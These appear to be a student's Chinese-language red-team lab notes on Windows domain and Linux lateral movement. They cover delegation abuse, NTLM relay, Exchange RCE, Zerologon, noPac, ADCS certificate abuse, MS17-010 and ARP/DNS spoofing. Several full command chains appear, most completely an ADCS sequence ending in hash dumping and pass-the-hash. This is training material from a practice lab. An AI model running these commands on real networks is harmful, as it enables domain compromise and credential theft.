[奇安信攻防社区-红队域渗透技术：委派攻击汇总（全） (butian.net)](https://forum.butian.net/share/1591)

1和靶场：上期135day

# 183: 资源委派

  配置的高级功能  windows2012以上

攻击条件：A机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性的    sid值对应B用户或者机器     这时候B就可以控制A。		msDS-AllowedToActOnBehalfOfOtherIdentity属性为ServiceA，也就允许ServiceA利用s4u2self协议代表其他用户身份来访问data的话，那我们就可以做到横向移动及提权等操作。

 在机器上操作         sid值都不同

![1733582509627](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942251.png)

  退域在加域。下面这种不符合资源约束委派（第一种）的攻击条件:

![1733582926038](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942252.png)

#### 利用

先看sid值是否相同（1），不同再看是否在ao组（2），最后再看（3）

资源约束委派利用分类：

1、通过管理主机加入域的用户拿下主机

2、已知Acount Operators组用户拿下主机

3、结合HTLM Relay攻击拿下主机（CVE-2019-1040）

#### 1 利用管理主机

条件：

1、允许创建机器账户

2、具有管理主机加入域的用户账户。也就是说sid值要相同，一个是被控机sid和目标机sid值相同，这样才能控制目标机

 前面翻车，换域，god.org 成功在sql机上查询被域用户创建的机器账户列表。条件是需要都是同一个sid值，查到后可以看当前被控机的用户可以通过sid资源委派还能控制哪些机器。

符合利用条件----查询被域用户创建的机器账户列表:：

![1733584843470](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942253.png)

  将test7用户加入到win8和Win7的sid控制，这里环境就是win7机器是test7用户 ，win8是datax用户，查询他俩的sid值相同，查询sid对应的用户为test7用户。两个机器都是用test7用户加入域。-----------重新梳理：win7-----test7机器（这里的机器是在域里面的机器名字）-----  test7用户加入域。     win2008(win8)-----datax机器--------test7用户加入域

满足了攻击条件，sid值相同，并且sid对应的用户为被控机用户。就可以借助被控机（win7）来控制（资源委派）另一个机器(win8)

本地是windows7-------xdpc(用户)----test7 （域内机器名）     win10-----xdpc(用户)------datax（域内机器名）

![1733585052719](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942254.png)

收集信息：

![1733644904364](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942255.png)

查找相同的sid用户-----xdpc：

![1733585149490](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942256.png)

环境问题，被控机不出网，还是在本地演示，就不在c2服务器上演示了，说明意思即可(信息收集就不演示了)。----    被控机为win10，sid符合当前攻击条件且被控机用户刚好也是sid值相同的用户：

​     	开始利用，3个方案 ：addcpmputer（需要明文）  bloodyad（需要明文）  												powermad(不需要明文)不过需要上传文件（推荐使用这个）。上传的是自己powershell的模块，用来创建一个新用户(xiaodiA)，然后再用另一个模板来获取新增用户的sid值，最后用命令来修改目标主机data的委派属性sid修改成新建用户的，修改成自己新建的用户来资源委派控制data机。也就是datax机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性sid值修改成自己新建的用户sid值。 

这里为什么要新建一个用户来继而控制data机呢？为什么不直接用被控机test7来控制：													因为后续的攻击需要被控机的明文密码等条件，如果这里被控机明文密码不知道，那就无法进行后续，而新建的用户密码是知道的。

使用PowerMad工具创建机器账户（脚本工具先上传上去）新建用户成功：

![1733645688943](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942257.png)

获取新增的xiaodiA的sid值--powershell Import-Module .\PowerView.ps1;Get-NetComputer xiaodiA -Properties objectsid  ：

![1733646005585](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942258.png)

下来就是将xiaodiA的sid值委派给datax，这样xiaodiA就成datax的领导-----先看这里datax是没有设置“领导”：

![1733646113271](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942259.png)

修改datax的领导值为xiaodiA的sid值  (小翻车------这里需要将powershell提到管理员权限，否则执行不了会报错，下来就是执行成功)：

![1733646943159](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942260.png)

  用新建的(xiaodiA)连接被控机，连接工具为im工具箱里的py工具，还是socks代理，然后本地连接。下来就是利用xiaodiA生成连接票据，在导入，利用。

利用xiaodiA申请访问datax主机cifs服务票据------这里环境问题就在本地演示了-----正常应该socks代理然后py生成票据，将票据上传目标机后用mimikate导入利用：

![1733648960340](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942261.png)

导入票据到内存：

![1733649148733](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942262.png)

连接利用票据：-----------小插曲，弄错了搞反了：这里的win10被控机是datax机器，而目标Win7是test7用户，test计算机。所有前面一样，需要更改一些：

修改datax主机委派属性时候将目标改为test7（刚才是datax）,cifs服务票据里面也改test7为目标

![1733653257904](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942263.png)

![1733653314396](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942264.png)

然后还有注意都是管理员权限，powershell也是-------导入票据到内存（不需要在命令行中继续包含 `mimikatz` 命令，直接敲命令就行）--------连接利用票据：

![1733653450332](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942265.png)

这里连接也是在管理员的窗口运行（已踩坑）

![1733653571986](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942266.png)

#### 2 利用AO组

1h07第二种工具的环境配置：win7----webadmin（机器名----在域里面的名字）----webadmin用户加入域     win2008-----datax-----test7用户加入域 。

win10------webadmin------webadmin           windows7-------xdpc(用户)----test7

![1733653890223](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942267.png)



![1733656214337](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942268.png)



 条件：被控用户属于Acount Operators组的用户账户,因为这组里面的成员可修改域内任意主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性。(除DC)，然后这里查询当前后发现被控机用户刚好在这组内。下面思路基本一样，添加xiaodiB用户，获取sid值。代理，获取票据，导入，建立连接

加ao组后：

![1733656511526](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942269.png)

将webadmin加入ao组前后前使用查看命令------判断有没有利用条件：

![1733656735966](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942270.png)

此时ao组成员webadmin刚好为被控机，所以可以利用，后续和前面一样，主要就是要有能创建用户的权限。能执行第一步：使用PowerMad工具创建机器账户powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString "123456" -AsPlainText -Force) ，后面一样

#### 3：HTLM Relay

结合HTLM Relay攻击。利用漏洞

1、能创建机器账户

2、目标开启打印机服务

 翻车~      kali监听，然后利用打印机漏洞让DC强制访问被控机，得到hash。后面利用hash生成票据。。。。

条件：

![1733661927163](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942271.png)

这里是使用ntlmrelayx工具responder -I eth1 -wd进行监听，但是需要代理，因为要在同一个网段里才能监听到，然后用  python printerbug.py xiaodi.local/webadmin:admin!@#45@(DCip)   (kali ip )  ,强制让kali访问监听的得到DC的hash，

# 184：重放攻击

中间人攻击，NTML、重放攻击。

捕获，重放，爆破           kali环境已配好，3个网卡，既能和本机通讯，也能和god内网通讯

  捕获，用kali (配置时候记得先拍个快照)，一般用钓鱼 ，让对方访问（被动方式）。用得到的hash值可以重放， kali 监听webserver，sqlserver执行访问kali的命令（net use  ip(kali)会将自己的用户密码给kali），然后得到web的回弹。kali就是做的是中继重放，然后给了web，web比对后和sql密码一致，执行了kali重放过来的上线命令。31web   32sql  21 DC

kali监听，用web机进行通讯---因为web和kali的账户密码不匹配，所以没有成功，不过得到的hash可以用来比对重放：

![1733753163835](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942272.png)









 不同用户/相同用户都尝试,。web用administrator去尝试连接sql成功，反之sql也是。web用自己的webadmin用户去连接sql不行，拒绝。就是因为用户密码不同。这里就是web机重放攻击sql机

 降权 令牌窃取和进程注入。

  脚本重放攻击

 破解重放的hash ------- 重放失败 

![1733757925010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942273.png)

   强制的。  Coercer 自动化工具。让目标主机强制的访问别的主机（前面是钓鱼式的）。然后就可以抓到目标访问的hash，拿到后可以用来利用。

##### 强制访问

让目标主机（21）强制访问被控机（32）：

![1733757243654](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942274.png)

被控机sql监听：

![1733757315850](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942275.png)

或者在kali中监听，让DC强制访问kali主机：

![1733757476371](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942276.png)



  另2个工具。先用前面的工具smbrelayx.py监听，再用下来的两个工具进行强制访问获取hash -------- 。就是让目标用户（Web机被控机）访问本机（kali），然后本机在将请求重放到3.22DC（目标机）后在执行whoami。这里需要用户密码都对应着。

![1733757857637](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942277.png)

最后还是用PetitPotam.py实现强制让目标访问kali，kali本地用py监听成功收到：

强制访问：让31访问128

![1733758304978](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942278.png)

监听到webserver的目标，wd：

![1733758369861](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942279.png)

，总结用这些方法主要还是看环境，看环境适用哪种方法。强制访问抓的是机器密码，钓鱼抓的是用户密码

 不断翻车，没有复现

# 185：exchange

是微软公司的一套电子邮件服务组件，是个消息与协作系统。

1：自身漏洞

2：钓鱼攻击

3：暴力破解

  信息收集  代理。这里是google浏览器证书问题，他会检测是否在内网浏览器，然后换火狐浏览器。ip+/owa。    环境说明：cs服务器和内网机在同一个网段。方便操作

![1733885385238](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942281.png)

通过端口扫描、SPN探测等手法发现Exchange服务：

![1733885497007](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942282.png)

结果：

![1733885625511](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942283.png)

SPN探测，先获取到域名（shell net time /domain），然后SPN技术探测开放了哪些服务：

![1733886017828](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942284.png)

这里发现DC机器开放了exchange服务，并且得到了DC机器名，然后ping DC机器名得到DC的ip地址：

![1733886115060](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942285.png)

这里exchange服务默认是https,所以访问时候需要加https，用火狐浏览器打开-----socks代理建立

![1733890517797](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942286.png)

owa:

![1733890561798](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942287.png)

这里密码就是抓，导，爆破获取明文密码。

#### 1：

这里开代理用bp暴力'''''破解。  bp的代理设置。

![1733890813326](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942288.png)

信息收集：脚本matchvul.py  （这里还是socks代理已经配置好）。或者查看源代码找到exchange版本号，然后在微软官方上查版本对应。

![1733891229058](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942289.png)

找到版本号查找对应产品版本

![1733891363327](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942290.png)

 演示一下怎么从普通用户拿到域内用户账号密码，提权----mimikate需要高权限抓取，抓取明文密码。 下来然后用网上的exp进行攻击。最后会写一个Webshell进去，然后就 连接上线

![1733894720750](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942291.png)

编译生成exe后运行，这里还是socks已建立----------报错：

![1733895126006](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942292.png)

更改hosts：

![1733895146445](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942293.png)

成功写入shell：

![1733895196960](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942294.png)

![1733895245525](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942295.png)

打开写入的文件，这里只需要将shell改为webshell就可连接：

![1733895326068](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942296.png)

#### 2：

  另一个漏洞脚本.需要更改域名的host地址，还需要生成一个反序列化的payload， 更换目标机：exchange2013版本机器sp1， socks代理配好后，用脚本Cve2020-0688进行连接，生成一个ysoserial.exe的命令，用命令在ysoserial.exe上执行生成一个反序列化的payload，将这个payload在脚本Cve2020-0688中运行后能执行Rce。条件：需要一个普通域内用户的账号密码

这里失败，因为是需要exchange-sp3版本，这里是sp2版本,换环境：rootkit域

环境没有搭建，这先凑合着看，这儿对py版本还有要求：

![1733896357925](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942297.png)

执行后会生成一个命令，这里是让他执行mstsc命令（远程桌面连接）：

![1733896958499](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942298.png)

将命令用ysoserial.exe运行生成反序列化字符串：

![1733897053617](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942299.png)

将生成的反序列化字符串重新复制到刚才的cve下的payload中执行：

 ![1733897252056](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942300.png)

然后目标DC机就会执行mstsc打开。

 没有用户凭证时：proxyshell工具，这里环境不适用，适合打新版本，需要的目标版本条件比较苛刻

python exchange_proxyshell.py -u https://192.168.3.142

![1733897498222](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942301.png)



  钓鱼 ：免杀后门附件、网站监听获取ntml hash---------发一个内网ip（被控机），然后诱惑点击

#  ![1733897952043](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942302.png)

发给DC进行钓鱼：

![1733897993239](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942303.png)



# 186：CVE

下面的py基本用的都是py3.8版本的

### cve-2020-1472  

这里记得拍个快照，因为重置密码后会破坏DC的环境，导致DC叽了

条件：只需要域内一个机器，版本符合。 。还需要修改hosts地址（C:\Windows\System32\drivers\etc\hosts）：修改域名地址，让本地计算机能找到，不修改的话本地计算机就会在外网找符合域名的地址，找不到对应计算机名字。

环境配不好，域加不进去，网络问题，需要更改和DC一一致，这里一拍：

![1733928009187](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942304.png)

 用cve的cve-2020-1472-exploit.py工具，(socks代理已建立)将DC的密码可以置空。将DC当前连接可以不用密码。再用secretsdump.py（使用空密码连接）获取域内的所有hash，（这里密码都置空了，为什么还要获取hash值）这个工具可以不需要密码，但是后面用wmiexec.py（可以rce）连接dc还是需要hash，所以上面还是得先拿到域内hash。

得到Dc主机名和ip地址

![1733928492462](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942305.png)

实战还是有点风险，毕竟将DC置空了，然后用脚本将DC置空（这里有点慢），无论是否能ping通对方Ip，都给我把socks代理搭建起来！！！！！一晚上就省事情，看自己能和DCping通，就没有搭建代理，结果最后就是这个问题，复现成功，置空：

![1733930889223](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942306.png)

![1733930949150](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942307.png)

然后置空后用secretsdump.py脚本进行爆破hash值，将DC下的所以hash爆出来

![1733931096818](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942308.png)

获取的hash值，找到DC的hash:

![1733931204733](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942309.png)

连接域控PTH，拿到shell:

![1733931281558](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942310.png)

操作完记得恢复DC密码，不然DC就崩了

### Cve-2021-42281

 条件：需要一个域内用户的明文账户密码(2012以上不好获取明文)。建立连接，更改hosts。版本符合

这种回显就说明有此漏洞（scoks）：

![1733931718975](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942311.png)

还是用scanner.py工具扫看是否存在漏洞，再用nopac.py进行全自动-----------然后重置一下环境（）翻车--------- 使用kali进行测试，成功。用sam_the_admin.py（hosts也得设置一下，绑定好域名。

报错是因为上一个漏洞将DC打坏了，这里需要恢复一下DC快照

![1733931821853](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942312.png)

恢复后，还是有点问题，所以最后选择用kali版本进行操作。--配好代理。

![1733997980652](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942313.png)

这里我本地DC好像坏了，没有反弹shell成功，不过正常是反弹回来 的

![1733997943625](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942314.png)

经过99810难，重新配置了环境------直接拿到shll：

![1734008376528](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942315.png)

这里web加域时候报错，什么找不到域，无法与域建立连接时候：

![1734008511638](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942316.png)

exe的工具（不推荐使用）：

### cve-2022-26932

ADCS攻击

条件：

![1734008621276](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942317.png)

  域里面需要安装对应证书。一个域内用户机。这里工具在kali上，文档中的命令适用于2023以下certipy3，看看自己的kali是啥时候的，2023以上是Certipyr4，命令会有差异。

检测DC是否有证书：

![1734008693421](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942318.png)



  演示。还是得先配好代理， 这里的目标god机没有安装对应的证书服务，所以测试失败。

  重新换目标机，安装了漏洞利用的证书服务：win2016 ------ xiaodii.local。背景：信息收集好------CS中获取CA结构名和计算机名---------域内信息，kali配置好hosts，kali 代理proxychains配置好。用工具certipy生成一个证书，然后检测，添加一个机器，然后修改机器属性，dnshost和DC一致，在用刚才生成的机器生成证书，在检测证书，然后导出许多域内hash（secretsdump.py），用wmiexec.py利用得到的hash进行建立。注意：这里前面都需要加代理proxychain4命令

这里还是需要配置环境。1、申请低权限用户证书：

certipy req 'xiaodi.lab/test:Pass123@dc.xiaodi.lab' -ca xiaodi-DC-CA -template User -debug 



2、检测证书

certipy auth -pfx test.pfx -dc-ip 192.168.3.111



3、创建一个机器账户：

python3 bloodyAD.py -d xiaodi.lab -u test -p 'Pass123' --host 192.168.3.111 addComputer pwnmachine 'CVEPassword1234*'



4、设置机器账户属性(dNSHostName和DC一致)：

python3 bloodyAD.py -d xiaodi.lab -u test -p 'Pass123' --host 192.168.3.111 setAttribute 'CN=pwnmachine,CN=Computers,DC=xiaodi,DC=lab' dNSHostName '["DC.xiaodi.lab"]'



5、再次申请证书：

certipy req 'xiaodi.lab/pwnmachine$:CVEPassword1234*@192.168.3.111' -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug



6、检测证书：

certipy auth -pfx ./dc.pfx -dc-ip 192.168.3.111



7、导出HASH：

python3 secretsdump.py 'xiaodi.lab/dc$@DC.xiaodi.lab' -hashes :10e02bef2258ad9b239e2281a01827a4



8、利用HASH：

python3 wmiexec.py xiaodi.lab/administrator@192.168.3.111 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd

### CVE-2017-0146

MS17010  ----------- 系统漏洞。直接是对系统打。

这里用msf进行打win7机，msf怎么进行代理通讯呢》所以这里是让目标机直接上线到msf，这里cs首先先有了一个被控机，这里也可以用cs上传直接上传msf,exe后门，但是用另一种方法：将cs的移植到msf上：

 : CS创建监听器、配置msf和监听器对应。spawn 监听器名字。这里为什么正向后门在仔细听听。

![1734009824988](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942319.png)

msf：

![1734010040538](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942320.png)

cs将目标机权限给msf：

![1734010100453](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942321.png)

msf监听到：

![1734010127391](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942322.png)

得到目标web机权限后，添加查看路由，发现3网段有路由：

![1734010333483](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942323.png)

检测模块，检测是否存在漏洞：

![1734010363099](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942324.png)

结果解释：gpt

![1734010428005](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942325.png)

这里msf是cs移交过来的权限，所以选择正向，msf可以找到web机，web机找不到，web机和msf中间有cs。

![1734010531304](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942326.png)

 换一个msf重新进行测试，最后还是小翻车，看第二级---------最后是因为目标机的DC没有开，所以导致没有成功，攻击条件有一个smb协议，DC没有同步过来。

![1734010875985](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942327.png)

# 187：域森林

不用复现。需要内存和运行不起来。

主要是与前面课程的单域环境之间看有什么差异。



![1734011322125](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942328.png) 

这里可以看见前面有很多的....                 h.hr.xiaodi.org

![1734011644197](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942329.png)

这里也可以Ping hhrdc来定位ip

当前处于           hr.xiaodi.org           上一级就是xiaodi.org          下一级是  xx.hr.xiaodi.org

看有没有上一级或者下一级还可以看计算机名字

XDORG（xiaodi.org）					XDORG/webadmin     xiaodi.org的域用户

​	HRXRORG(hr.xiaodi.org)				   hr.xiaodi.org的域为：HRXRORG

​		HHRORG(h.hr.xiaodi.org)               h.hr.xiaodi.org的域为：HHRORG

​	GAXDORG(ga.xiaodi.org)						GAXDORG/administrator      ga.xiaodi.org的DC

​		GGAORG(h.ga.xiaodi.org)

XIAODI8（xiaodi8.org）

横向移动时候，其实主要还是看域用户对应正确，然后口令密码正常。限制：网络不通讯，就打一个能与自己通讯然后一层一层绕到能和目标通讯的机子

域名     ----- 域内用户    ---------- 用户密码 -------------  通讯---- DC的ip        这几个都要一一对应

这节就不复现了，因为主要为理解，没有太多知识

# 188：工作组

 针对的是工作组和局域网下的环境，非域环境。攻击主要是针对网络攻击，与目标是什么操作系统无关

内网：域环境，工作组

中间人攻击：SSLStrip攻击、ARP欺骗攻击、SSL劫持攻击。。。。

网络环境：

![1734085220532](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942330.png)

##### arp：

  	火绒---139.139       win7 ----  139.2         360 ----139.131       kali        ping后获取到ip和Mac地址，在火绒上用科来对目标win7 发送错误的mac地址，使目标ip的mac地址改为自己已经设置的，这样目标win7  就没有网络了。这就是单向欺骗。所以一般需要将ip和mac地址绑定，这样mac地址就为静态了，攻击网络就不会发生没网的情况了。这就是骗ip我是你的网关（mac地址）

网关地址：192.168.139.2                 目标机work----139.129    目标机360：139.132

因为这里是动态的，所以就先用单向欺骗：

![1734095544195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942331.png)

科莱-------单向欺骗：

![1734096865321](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942332.png)

目标机反应：

![1734096707202](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942333.png)

断网：

![1734096812638](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942334.png)



  双向欺骗----------既骗ip我是你的网关，又骗网关我是你的ip。----------         断网

![1734097484022](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942335.png)

用自己的mac地址伪造成360的ip

![1734098013483](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942336.png)

用别的ip伪造mac地址

![1734098129871](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942337.png)

开始：

![1734098219907](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942338.png)

  确保本机（攻击机）和目标机（手机）在同一个局域网下。科莱正常来说是抓不到手机的流量的。需要用工具来抓手机的流量------Arpspoof-----需要用管理员运行 ---------- 先过去目标网段。自动执行双向欺骗，充当一个中间人给双方发送流量，----------Arpspoof运行后，本机科莱就可以监听到手机流量了

这里搞不了，电脑内存跟不上科莱的节奏

![1734098769098](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942339.png)

管理员运行，不过就是arpspoof.exe 手机ip 就可以在科莱中监控到手机流量

不会影响目标网络通讯

##### dns欺骗：

 可能会引起目标网络不稳定，所以与arp比起来还是差点意思ettercap------kali里的ettercap，这里还需要修改一个文件，* A ip   修改解析。然后这里修改文件里还有个插件----就是dns欺骗。实现就是域名相同，但是打开的页面是自己显示出的页面。会掉完。

在内网域中用不了是因为内网域是由DC操控的，都听DC的，不会被骗

![1734099054574](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942340.png)

修改这个文件：

![1734100464710](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942341.png)

配置文件

![1734100530994](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942342.png)

后面即可开始攻击

![1734100606325](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942343.png)

![1734100621085](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942344.png)

使用插件里面的这个进行钓鱼

![1734100654647](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942345.png)

# 189: linux

linux横向移动主要为ssh、web。         这里10、30、50都是机器ip的尾缀（前面都是172.16.250）

shh协议中，登录连接目标机器主要方式有密码和密钥对（密钥对文件）登录

​        看主机是密码还是密钥登录方式。密码就是猜测爆破得到，密钥就是找配置文件或者在历史命令中找，全局搜索命令

![1734265624954](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942346.png)

![1734253580338](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942347.png)

  全局搜索、搜索含有SSH凭证文件

![1734265688504](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942348.png)

  linux靶场，先拿到web权限后提权---这里是tomcat用户权限（10机器），所以需要提权，这里是linux提权，这里选择用脏牛提权，先将脏牛漏洞里的.c上传放到目标的tmp目录，然后gcc编译目标.c文件成可执行文件，因为脏牛系列会弹shell所以这里需要先用py起一个终端在执行文件，然后在用命令让反弹的权限持续下来。

先namp扫到目标机：-----这里眼瞎了耽搁，没看清ip然后xd给了靶场的账号密码。

nmap扫太慢了。就是扫到了3个ip  分别就是图上的3个ip，这里就不看了------环境说明kali 和目标机在一个网段中

![1734267076853](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942349.png)

#### 10

目标机上存在strut2的历史漏洞：

![1734267254293](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942350.png)

拿到10的权限：

![1734267300129](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942351.png)

.c上传放到目标的tmp目录，然后gcc编译目标.c文件成可执行文件（当然这里目标机是有gcc环境的）

![1734267559024](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942352.png)



脏牛系列会弹shell所以这里需要先用py起一个终端在执行文件

![1734267622068](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942353.png)

用命令让反弹的权限持续下来

![1734267780901](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942354.png)

这里注意：这两个命令都要执行，刚才就只执行第一个导致掉线了。

![1734268220373](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942355.png)

#### 30：

得到root权限后查看历史命令发现用过密钥文件登录过其他主机，这里就将密钥文件下载到本地，然后利用文件登录另一台目标主机（30主机）-----------这里得到30主机后因为是通过ssh密钥连接，但是没有8080端口权限，因为50机器的3306是和30机器的8080端口是有关系的，所以这里需要先得到30主机的8080端口权限。

查看历史命令，找到了密钥对文件，所以将密钥对文件复制到本地来，因为本地也可以和30通讯

![1734268324008](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942356.png)

![1734270231653](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942357.png)

这里kali 的ssh坏了，没修好，不过执行下面两个命令后就可以连接得到30的权限：

![1734270098226](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942358.png)



后面本机ssh成功，下面有解释：

![1734273923643](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942359.png)

​      30主机的8080在DMZ区，所以本地是访问不到，需要在10建立节点通讯（这里是因为30在DMZ区域，本地只能访问到22端口，访问不到8080，所以建立30节点也不行，而10访问30时可以访问到30的8080端口），这里是linux的msf创建节点。

![1734270464496](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942360.png)

  配置节点有个坑，创建了却访问不到，需要先将被控机路由添加进来然后在建立节点，这里就成功建立节点了，还有配置proxychaix.config文件时，不仅要改端口和版本，这里还有更改动态和静态配置--------  还是翻车，最后用的是windows的proxifier进行配置代理。不过上面的节点还是需要建立的。

建立路由：

![1734270707798](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942361.png)

![1734270701749](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942362.png)

还需要改这儿：意思就是当使用proxychains4时候，这时候的流量就是一直走代理，不是执行一次才走一次。

![1734270849776](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942363.png)

配置好，记得   run：

![1734271594450](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942364.png)

![1734271651872](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942365.png)

建立通讯：

![1734271724580](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942366.png)

#### 50：

找到jenkins路径后打开发现有credentials,这里是存放密钥的地方

![1734271813045](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942368.png)

